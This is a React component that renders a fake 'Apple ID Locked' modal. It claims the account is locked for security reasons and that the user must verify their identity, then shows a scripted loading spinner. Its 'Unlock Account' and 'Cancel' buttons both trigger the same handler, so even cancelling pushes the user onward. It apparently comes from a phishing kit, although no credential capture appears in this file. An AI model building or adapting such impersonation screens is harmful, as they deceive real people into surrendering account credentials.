import React from "react";
import { useState } from "react";

const Locked = ({ onClick }) => {
  const [isLoading, setisLoading] = useState(true);
  const [isLoaded, setisLoaded] = useState(false);

  setTimeout(() => {
    setisLoading(false);
    setisLoaded(true);
  }, 2000);

  return (
    <div>
      <div
        className="fixed z-10 overflow-y-auto top-0 w-full left-0"
        id="modal"
      >
        <div className="flex items-center justify-center min-height-100vh pt-4 px-4 pb-20 text-center sm:block sm:p-0">
          <div className="fixed inset-0 transition-opacity">
            <div className="absolute inset-0 bg-gray-900 opacity-80"></div>
            <span className=" inline-block align-middle h-screen">​</span>
            <div
              className="inline-block align-middle bg-white rounded-lg text-left overflow-hidden shadow-xl transform transition-all sm:my-8 sm:align-middle sm:max-w-lg sm:w-full"
              role="dialog"
              aria-modal="true"
              aria-labelledby="modal-headline"
            >
              <div className="flex flex-col items-center p-4">
                <h1 className="font-semibold text-xl text-gray-700">
                  Apple ID Locked
                </h1>
                <p className="text-center text-sm sm:text-base px-4 md:px-0 mb-2">
                  Your Apple ID has been locked for
                  <br />
                  security reason. To unlock it,you
                  <br />
                  must verify your identity.
                </p>
              </div>
              {isLoaded && (
                <>
                  <div className="loaded">
                    <div
                      className="text-center p-3 sm:p-4 border text-sky-600 cursor-pointer"
                      onClick={onClick}
                    >
                      Unlock Account
                    </div>
                    <div
                      className="text-center p-3 sm:p-4 border text-sky-600 cursor-pointer"
                      onClick={onClick}
                    >
                      Cancel
                    </div>
                  </div>
                </>
              )}
              {isLoading && (
                <>
                  <div className="flex justify-center items-center p-8">
                    <img
                      className="h-12 w-12"
                      src="https://icons8.com/preloaders/preloaders/1488/Iphone-spinner-2.gif"
                      alt=""
                    />
                  </div>
                </>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Locked;
